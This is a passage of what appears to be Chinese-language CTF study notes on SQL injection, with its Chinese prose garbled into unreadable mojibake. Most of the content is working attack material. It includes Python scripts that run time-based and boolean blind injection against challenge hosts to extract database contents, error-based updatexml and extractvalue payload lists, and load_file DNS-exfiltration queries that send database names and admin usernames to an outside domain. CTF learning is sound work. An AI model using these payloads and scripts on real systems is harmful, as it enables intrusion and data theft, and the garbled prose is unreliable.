class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &quot;1&#39; (case substr(database()from 1 for 1) &#x3D; [string] then sleep(3) else 1 end))#&quot;</span><br><span class="line">&#x2F;&#x2F;æœ€åä¸€ä¸ª)ç”¨æ¥é—­åˆ #ç”¨æ¥æ³¨é‡Š</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°±å¯ä»¥å†™è„šæœ¬äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">allString = <span class="string">'''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'"|\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line">url = <span class="string">"http://123.206.87.240:8002/web15/"</span></span><br><span class="line">data = <span class="string">""</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> allString:</span><br><span class="line">        payload = <span class="string">"1'+(case when (substr(database() from &#123;0&#125; for 1) = '&#123;1&#125;') then sleep(4) else 1 end))#"</span>.format(i,j)</span><br><span class="line">        headers = &#123;<span class="string">'x-forwarded-for'</span>:payload&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url = url,headers = headers,timeout = <span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(<span class="string">"flag is :&#123;"</span> +flag+<span class="string">"&#125;"</span>)</span><br><span class="line">//æ•°æ®åº“</span><br><span class="line">payload = <span class="string">"1'+(case when (substr(database() from &#123;0&#125; for 1) = '&#123;1&#125;') then sleep(4) else 1 end))#"</span>.format(i,j)</span><br><span class="line">åº“ä¸ºweb15</span><br><span class="line">//è¡¨</span><br><span class="line">payload = <span class="string">"1'+(case when (substr((select group_concat(table_name)from information_schema.tables where table_schema='web15') from &#123;0&#125; for 1) = '&#123;1&#125;') then sleep(4) else 1 end))#"</span>.format(i,j)</span><br><span class="line">è¡¨ä¸ºclient_ip,flag</span><br><span class="line">//åˆ—</span><br><span class="line">payload = <span class="string">"1'+(case when (substr((select group_concat(column_name)from information_schema.columns where table_name='flag') from &#123;0&#125; for 1) = '&#123;1&#125;') then sleep(4) else 1 end))#"</span>.format(i,j)</span><br><span class="line">flag</span><br><span class="line">//flag</span><br><span class="line">payload = <span class="string">"1'+(case when (substr((select * from flag) from &#123;0&#125; for 1) = '&#123;1&#125;') then sleep(4) else 1 end))#"</span>.format(i,j)</span><br></pre></td></tr></table></figure><p>å°±å¯ä»¥å¾—åˆ°flagäº†ã€‚</p><blockquote><p>flag{cdbf14c9551d5be5612f7bb5d2867853}</p></blockquote><h3 id="å¤šæ¬¡ï¼ˆmidå¸ƒå°”ç›²æ³¨ï¼‰"><a href="#å¤šæ¬¡ï¼ˆmidå¸ƒå°”ç›²æ³¨ï¼‰" class="headerlink" title="å¤šæ¬¡ï¼ˆmidå¸ƒå°”ç›²æ³¨ï¼‰"></a>å¤šæ¬¡ï¼ˆmidå¸ƒå°”ç›²æ³¨ï¼‰</h3><p>ä¸»è¦å­¦ä¹ ä¸€ä¸‹<strong>å¼‚æˆ–æ³¨å…¥</strong>åˆ¤æ–­è¿‡æ»¤äº†å“ªäº›å…³é”®è¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">å¼‚æˆ–ï¼š1^1&#x3D;0ï¼Œ1^0&#x3D;1ï¼Œ0^1&#x3D;1ï¼Œ0^0&#x3D;0</span><br><span class="line">è¿™æ ·å½“æ„é€ ï¼š?id&#x3D;1&#39;^(length(&#39;and&#39;)&#x3D;0)--+</span><br><span class="line">è‹¥è¿”å›æ­£ç¡®é¡µé¢çš„å›æ˜¾(There is nothing.)ï¼Œåˆ™è¯´æ˜(length(&#39;and&#39;)&#x3D;0)ä¸ºå‡;</span><br><span class="line">è‹¥è¿”å›é”™è¯¯é¡µé¢çš„å›æ˜¾(Error,Error,Error!)ï¼Œåˆ™è¯´æ˜(length(&#39;and&#39;)&#x3D;0)ä¸ºçœŸã€‚</span><br><span class="line"></span><br><span class="line">è¿™é‡Œ?id&#x3D;1&#39;^(length(&#39;and&#39;)&#x3D;0)--+å‡å›æ˜¾äº†Error,Error,Error!ï¼Œè¯´æ˜(length(&#39;and&#39;)&#x3D;0)ä¸ºçœŸï¼Œé‚£ä¹ˆå¯åˆ¤æ–­andè¢«è¿‡æ»¤äº†</span><br><span class="line">åŒç†å¯åˆ¤æ–­orã€selectã€unionä¹Ÿè¢«è¿‡æ»¤äº†</span><br><span class="line">selselectect</span><br><span class="line">uniunionon</span><br></pre></td></tr></table></figure><p>æ³¨æ„çš„æ˜¯ï¼šinformationä¸­ä¹Ÿæœ‰or</p><p>ç»§ç»­å­¦ä¹ ç›²æ³¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">dic &#x3D; &quot;0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#123;&#125;_-&#x3D;&quot;</span><br><span class="line">s &#x3D; requests.session()</span><br><span class="line">url &#x3D; &#39;&#39;</span><br><span class="line">data &#x3D; &#39;&#39;</span><br><span class="line">for i in range(0,50):</span><br><span class="line">    for j in dic:</span><br><span class="line">        #payload &#x3D; &quot;http:&#x2F;&#x2F;123.206.87.240:9004&#x2F;Once_More.php?id&#x3D;1&#39; and mid((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39; --+&quot;.format(i,j)</span><br><span class="line">        #payload &#x3D; &quot;http:&#x2F;&#x2F;123.206.87.240:9004&#x2F;Once_More.php?id&#x3D;1&#39; and mid((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag2&#39;),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39; --+&quot;.format(i,j)p</span><br><span class="line">        payload &#x3D; &quot;http:&#x2F;&#x2F;123.206.87.240:9004&#x2F;Once_More.php?id&#x3D;1&#39; and mid((select binary group_concat(flag2) from flag2),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39; --+&quot;.format(i,j)</span><br><span class="line">        r &#x3D; s.get(url&#x3D;payload)</span><br><span class="line">        if &#39;Nobody&#39; not in r.text:</span><br><span class="line">            data +&#x3D; j</span><br><span class="line">            break</span><br><span class="line">    print(data)</span><br></pre></td></tr></table></figure><p>åŒæ—¶äº†è§£ä¸€ä¸‹æŠ¥é”™æ³¨å…¥</p><p>å¥½åƒæ³¨å…¥çš„æ—¶å€™æ˜¯ä¸éœ€è¦selectçš„ï¼Œä½†åœ¨mysqlä¸­æ˜¯éœ€è¦çš„</p><p><img src="/2020/12/09/SQL%E6%B3%A8%E5%85%A5/image-20200816164858101.png" alt="image-20200816164858101"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1%27%20and%20updatexml(1,concat(%27~%27,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema&#x3D;database())),1)%20--+</span><br></pre></td></tr></table></figure><h3 id="ctfhubï¼ˆifå¸ƒå°”ç›²æ³¨ï¼‰"><a href="#ctfhubï¼ˆifå¸ƒå°”ç›²æ³¨ï¼‰" class="headerlink" title="ctfhubï¼ˆifå¸ƒå°”ç›²æ³¨ï¼‰"></a>ctfhubï¼ˆifå¸ƒå°”ç›²æ³¨ï¼‰</h3><p>æ ¹æ®é¢˜ç›®å¯çŸ¥ç”¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(a,b,c) aå¯¹å°±æ‰§è¡Œbï¼Œå¦åˆ™å°±æ‰§è¡Œc</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªé¢˜ç›®æ­£å¥½æ˜¯id=1,2ä¼šå¯¹ï¼Œ3å°±é”™æ‰€ä»¥æˆ‘ä»¬æŠŠb=1æˆ–2ï¼Œcä¸º3</p><p>æ¥ä¸‹æ¥å†™è„šæœ¬å°±å¯ä»¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">dic &#x3D; &quot;0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#123;&#125;_-&#x3D;&quot;</span><br><span class="line">url &#x3D; &#39;&#39;</span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">s &#x3D; requests.session()</span><br><span class="line">for i in range(0,50):</span><br><span class="line">    for j in dic:</span><br><span class="line">        payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-9a3dce74d8324220.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if((mid((select database()),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;),1,3)&quot;.format(i,j)</span><br><span class="line">        r &#x3D; s.get(url&#x3D;payload)</span><br><span class="line">        if &#39;query_success&#39; in r.text:</span><br><span class="line">            flag +&#x3D;j</span><br><span class="line">            break</span><br><span class="line">    print(flag)</span><br><span class="line">#è¡¨</span><br><span class="line">payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-9a3dce74d8324220.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;,1,3)&quot;.format(i,j)</span><br><span class="line">#åˆ—</span><br><span class="line">payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-9a3dce74d8324220.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag&#39;),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;,1,3)&quot;.format(i, j)</span><br><span class="line">#flag</span><br><span class="line">payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-9a3dce74d8324220.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if(substr((select group_concat(flag)from flag),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;,1,3)&quot;.format(i, j)</span><br></pre></td></tr></table></figure><p>ä¸è¿‡ä¸­é—´å¥½åƒæ˜¯æœåŠ¡å™¨ä¼šå…³é—­æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ†ç»„æ‰«æ</p><p>æ¯”å¦‚ä»1-30ï¼Œ30-50</p><h3 id="ctfhubï¼ˆifæ—¶é—´ç›²æ³¨ï¼‰"><a href="#ctfhubï¼ˆifæ—¶é—´ç›²æ³¨ï¼‰" class="headerlink" title="ctfhubï¼ˆifæ—¶é—´ç›²æ³¨ï¼‰"></a>ctfhubï¼ˆifæ—¶é—´ç›²æ³¨ï¼‰</h3><p>å’Œä¸Šä¸€é¢˜ä¸€æ ·ç›´æ¥å†™è„šæœ¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">dic &#x3D; &quot;0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#123;&#125;_-&#x3D;&quot;</span><br><span class="line">url &#x3D; &#39;&#39;</span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">s &#x3D; requests.session()</span><br><span class="line">for i in range(0,50):</span><br><span class="line">    for j in dic:</span><br><span class="line">        try:</span><br><span class="line">            payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-72a758b783b1a2c2.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if((substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;),sleep(2),1)&quot;.format(i,j)</span><br><span class="line">            r &#x3D; s.get(url&#x3D;payload,timeout&#x3D;1)</span><br><span class="line">        except requests.exceptions.ReadTimeout:</span><br><span class="line">            flag +&#x3D;j</span><br><span class="line">            break</span><br><span class="line">    print(flag)</span><br><span class="line">#è¡¨</span><br><span class="line">payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-72a758b783b1a2c2.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if((substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;),sleep(2),1)&quot;.format(i,j)</span><br><span class="line">#åˆ—</span><br><span class="line">payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-72a758b783b1a2c2.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if((substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag&#39;),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;),sleep(2),1)&quot;.format(i,j)</span><br><span class="line">#flag</span><br><span class="line">payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-72a758b783b1a2c2.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if((substr((select group_concat(flag) from flag),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;),sleep(2),1)&quot;.format(i,j)</span><br></pre></td></tr></table></figure><h3 id="3-åŸºäºæŠ¥é”™çš„SQLç›²æ³¨"><a href="#3-åŸºäºæŠ¥é”™çš„SQLç›²æ³¨" class="headerlink" title="3.åŸºäºæŠ¥é”™çš„SQLç›²æ³¨"></a>3.åŸºäºæŠ¥é”™çš„SQLç›²æ³¨</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">' and updataxml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="comment">--+   //æŸ¥çœ‹ç”¨æˆ·</span></span><br><span class="line"><span class="string">' and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+  //æŸ¥çœ‹æ•°æ®åº“</span></span><br><span class="line"><span class="string">'</span> <span class="keyword">and</span> updataxml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">--+    //æŸ¥çœ‹æ•°æ®åº“çš„åå­—</span></span><br><span class="line"><span class="string">' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='</span><span class="keyword">test</span> <span class="string">' limit 0,1),0x7e),1) --+     //æŸ¥çœ‹å„è¡¨çš„åå­—</span></span><br><span class="line"><span class="string">'</span><span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'my student'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="comment">--+   //æŸ¥çœ‹åˆ—çš„åå­—</span></span><br></pre></td></tr></table></figure><h2 id="4-äºŒæ¬¡æ³¨å…¥"><a href="#4-äºŒæ¬¡æ³¨å…¥" class="headerlink" title="4.äºŒæ¬¡æ³¨å…¥"></a>4.äºŒæ¬¡æ³¨å…¥</h2><h3 id="0x01äºŒæ¬¡æ³¨å…¥åŸç†"><a href="#0x01äºŒæ¬¡æ³¨å…¥åŸç†" class="headerlink" title="0x01äºŒæ¬¡æ³¨å…¥åŸç†"></a>0x01äºŒæ¬¡æ³¨å…¥åŸç†</h3><p><strong>é˜²å¾¡è€…å¯èƒ½åœ¨ç”¨æˆ·è¾“å…¥æ¶æ„æ•°æ®æ—¶å¯¹å…¶ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è½¬ä¹‰å¤„ç†ï¼Œä½†åœ¨æ¶æ„æ•°æ®æ’å…¥åˆ°æ•°æ®åº“æ—¶è¢«å¤„ç†çš„æ•°æ®åˆè¢«è¿˜åŸå¹¶å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œå½“Webç¨‹åºè°ƒç”¨å­˜å‚¨åœ¨æ•°æ®åº“ä¸­çš„æ¶æ„æ•°æ®å¹¶æ‰§è¡ŒSQLæŸ¥è¯¢æ—¶ï¼Œå°±å‘ç”Ÿäº†SQLäºŒæ¬¡æ³¨å…¥ã€‚</strong></p><ul><li><p>ç¬¬ä¸€æ­¥ï¼šæ’å…¥æ¶æ„æ•°æ®<br>è¿›è¡Œæ•°æ®åº“æ’å…¥æ•°æ®æ—¶ï¼Œå¯¹å…¶ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è½¬ä¹‰å¤„ç†ï¼Œåœ¨å†™å…¥æ•°æ®åº“çš„æ—¶å€™åˆä¿ç•™äº†åŸæ¥çš„æ•°æ®ã€‚</p></li><li><p>ç¬¬äºŒæ­¥ï¼šå¼•ç”¨æ¶æ„æ•°æ®<br>å¼€å‘è€…é»˜è®¤å­˜å…¥æ•°æ®åº“çš„æ•°æ®éƒ½æ˜¯å®‰å…¨çš„ï¼Œåœ¨è¿›è¡ŒæŸ¥è¯¢æ—¶ï¼Œç›´æ¥ä»æ•°æ®åº“ä¸­å–å‡ºæ¶æ„æ•°æ®ï¼Œæ²¡æœ‰è¿›è¡Œè¿›ä¸€æ­¥çš„æ£€éªŒçš„å¤„ç†ã€‚</p></li></ul><h2 id="5-DNSæ³¨å…¥"><a href="#5-DNSæ³¨å…¥" class="headerlink" title="5.DNSæ³¨å…¥"></a>5.DNSæ³¨å…¥</h2><h3 id="0x01DNS"><a href="#0x01DNS" class="headerlink" title="0x01DNS"></a>0x01DNS</h3><p><img src="/2020/12/09/SQL%E6%B3%A8%E5%85%A5/image-20200609202338069.png" alt="image-20200609202338069"></p><h3 id="0x02æ³¨å…¥å‡½æ•°"><a href="#0x02æ³¨å…¥å‡½æ•°" class="headerlink" title="0x02æ³¨å…¥å‡½æ•°"></a>0x02æ³¨å…¥å‡½æ•°</h3><p><img src="/2020/12/09/SQL%E6%B3%A8%E5%85%A5/image-20200609203639074.png" alt="image-20200609203639074"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&quot;D:&#x2F;1.txt&quot;);  &#x2F;&#x2F;è¯»å–æ–‡ä»¶</span><br><span class="line">select load_file(&quot;\\\\xxx.php90.cn\\ccc&quot;)      &#x2F;&#x2F;è½¬ä¹‰</span><br></pre></td></tr></table></figure><h3 id="0x03æ³¨å…¥"><a href="#0x03æ³¨å…¥" class="headerlink" title="0x03æ³¨å…¥"></a>0x03æ³¨å…¥</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select load_file(concat(&quot;\\\\&quot;,(select database()),&quot;xxx.php90.cn\\cc&quot;));</span><br><span class="line">select load_file(concat(&quot;\\\\&quot;,(select username from admin),&quot;xxx.php90.cn\\cc&quot;));</span><br><span class="line">select load_file(concat(&quot;\\\\&quot;,select HEX(username) from admin limit 0,1),&quot;xxx.php90.cn\\cc&quot;));</span><br></pre></td></tr></table></figure><h2 id="6-æŠ¥é”™æ³¨å…¥"><a href="#6-æŠ¥é”™æ³¨å…¥" class="headerlink" title="6.æŠ¥é”™æ³¨å…¥"></a>6.æŠ¥é”™æ³¨å…¥</h2><p>æ›´è¯¦ç»†çš„è§£é‡Š<a href="https://xz.aliyun.com/t/253" target="_blank" rel="noopener">https://xz.aliyun.com/t/253</a></p><p>æŠ¥é”™æ³¨å…¥åœ¨æ²¡æ³•ç”¨unionè”åˆæŸ¥è¯¢æ—¶ç”¨ï¼Œä½†å‰æè¿˜æ˜¯ä¸èƒ½è¿‡æ»¤ä¸€äº›å…³é”®çš„å‡½æ•°ã€‚</p><p>æŠ¥é”™æ³¨å…¥å°±æ˜¯åˆ©ç”¨äº†æ•°æ®åº“çš„æŸäº›æœºåˆ¶ï¼Œäººä¸ºåœ°åˆ¶é€ é”™è¯¯æ¡ä»¶ï¼Œä½¿å¾—æŸ¥è¯¢ç»“æœèƒ½å¤Ÿå‡ºç°åœ¨é”™è¯¯ä¿¡æ¯ä¸­ã€‚è¿™é‡Œä¸»è¦è®°å½•ä¸€ä¸‹<code>xpathè¯­æ³•é”™è¯¯</code>å’Œ<code>concat+rand()+group_by()å¯¼è‡´ä¸»é”®é‡å¤</code></p><h3 id="xpathè¯­æ³•é”™è¯¯"><a href="#xpathè¯­æ³•é”™è¯¯" class="headerlink" title="xpathè¯­æ³•é”™è¯¯"></a>xpathè¯­æ³•é”™è¯¯</h3><p>åˆ©ç”¨xpathè¯­æ³•é”™è¯¯æ¥è¿›è¡ŒæŠ¥é”™æ³¨å…¥ä¸»è¦åˆ©ç”¨<code>extractvalue</code>å’Œ<code>updatexml</code>ä¸¤ä¸ªå‡½æ•°ã€‚<br>ä½¿ç”¨æ¡ä»¶ï¼šmysqlç‰ˆæœ¬&gt;5.1.5</p><p><strong>extractvalueå‡½æ•°</strong></p><blockquote><p>å‡½æ•°åŸå‹ï¼šextractvalue(xml_document,Xpath_string)<br>æ­£å¸¸è¯­æ³•ï¼šextractvalue(xml_document,Xpath_string);<br>ç¬¬ä¸€ä¸ªå‚æ•°ï¼šxml_documentæ˜¯stringæ ¼å¼ï¼Œä¸ºxmlæ–‡æ¡£å¯¹è±¡çš„åç§°<br>ç¬¬äºŒä¸ªå‚æ•°ï¼šXpath_stringæ˜¯xpathæ ¼å¼çš„å­—ç¬¦ä¸²<br>ä½œç”¨ï¼šä»ç›®æ ‡xmlä¸­è¿”å›åŒ…å«æ‰€æŸ¥è¯¢å€¼çš„å­—ç¬¦ä¸²</p></blockquote><p>ç¬¬äºŒä¸ªå‚æ•°æ˜¯è¦æ±‚ç¬¦åˆxpathè¯­æ³•çš„å­—ç¬¦ä¸²ï¼Œå¦‚æœä¸æ»¡è¶³è¦æ±‚ï¼Œåˆ™ä¼šæŠ¥é”™ï¼Œå¹¶ä¸”å°†æŸ¥è¯¢ç»“æœæ”¾åœ¨æŠ¥é”™ä¿¡æ¯é‡Œï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨ã€‚</p><p>pyloadï¼š<code>id=&#39;and(select extractvalue(&quot;anything&quot;,concat(&#39;~&#39;,(selectè¯­å¥))))</code></p><p>ä¾‹å¦‚ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;&#39;and(select extractvalue(1,concat(&#39;~&#39;,(select database()))))</span><br><span class="line">id&#x3D;&#39;and(select extractvalue(1,concat(0x7e,@@version)))</span><br><span class="line">12</span><br></pre></td></tr></table></figure><p>é’ˆå¯¹mysqlæ•°æ®åº“ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">æŸ¥æ•°æ®åº“åï¼šid&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select database()))))</span><br><span class="line">çˆ†è¡¨åï¼šid&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))))</span><br><span class="line">çˆ†å­—æ®µåï¼šid&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;TABLE_NAME&quot;))))</span><br><span class="line">çˆ†æ•°æ®ï¼šid&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME))))</span><br><span class="line">1234</span><br></pre></td></tr></table></figure><p>æ³¨ï¼š</p><ul><li>â‘  0x7e=â€™~â€™</li><li>â‘¡ concat(â€˜aâ€™,â€˜bâ€™)=â€œabâ€</li><li>â‘¢ version()=@@version</li><li>â‘£ â€˜~â€˜å¯ä»¥æ¢æˆâ€™#â€™ã€â€™$â€™ç­‰ä¸æ»¡è¶³xpathæ ¼å¼çš„å­—ç¬¦</li><li>â‘¤ extractvalue()èƒ½æŸ¥è¯¢å­—ç¬¦ä¸²çš„æœ€å¤§é•¿åº¦ä¸º32ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦çš„ç»“æœè¶…è¿‡32ï¼Œå°±è¦ç”¨substring()å‡½æ•°æˆªå–æˆ–limitåˆ†é¡µï¼Œä¸€æ¬¡æŸ¥çœ‹æœ€å¤š32ä½</li></ul><p><strong>updatexml</strong></p><blockquote><p>å‡½æ•°åŸå‹ï¼šupdatexml(xml_document,xpath_string,new_value)<br>æ­£å¸¸è¯­æ³•ï¼šupdatexml(xml_document,xpath_string,new_value)<br>ç¬¬ä¸€ä¸ªå‚æ•°ï¼šxml_documentæ˜¯stringæ ¼å¼ï¼Œä¸ºxmlæ–‡æ¡£å¯¹è±¡çš„åç§° ç¬¬äºŒä¸ªå‚æ•°ï¼šxpath_stringæ˜¯xpathæ ¼å¼çš„å­—ç¬¦ä¸²<br>ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šnew_valueæ˜¯stringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„è´Ÿè·æ¡ä»¶çš„æ•°æ® ä½œç”¨ï¼šæ”¹å˜æ–‡æ¡£ä¸­ç¬¦åˆæ¡ä»¶çš„èŠ‚ç‚¹çš„å€¼</p></blockquote><p>ç¬¬äºŒä¸ªå‚æ•°è·Ÿextractvalueå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°ä¸€æ ·ï¼Œå› æ­¤ä¹Ÿå¯ä»¥åˆ©ç”¨ï¼Œä¸”åˆ©ç”¨æ–¹å¼ç›¸åŒ<br>payloadï¼š<code>id=&#39;and(select updatexml(&quot;anything&quot;,concat(&#39;~&#39;,(selectè¯­å¥())),&quot;anything&quot;))</code></p><p>ä¾‹å¦‚ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#39;and(select updatexml(1,concat(&#39;~&#39;,(select database())),1))</span><br><span class="line">&#39;and(select updatexml(1,concat(0x7e,@@database),1))</span><br><span class="line">12</span><br></pre></td></tr></table></figure><p>åŒæ ·ï¼Œé’ˆå¯¹mysqlï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">çˆ†æ•°æ®åº“åï¼š&#39;and(select updatexml(1,concat(0x7e,(select database())),0x7e))</span><br><span class="line">çˆ†è¡¨åï¼š&#39;and(select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema&#x3D;database())),0x7e))</span><br><span class="line">çˆ†åˆ—åï¼š&#39;and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where 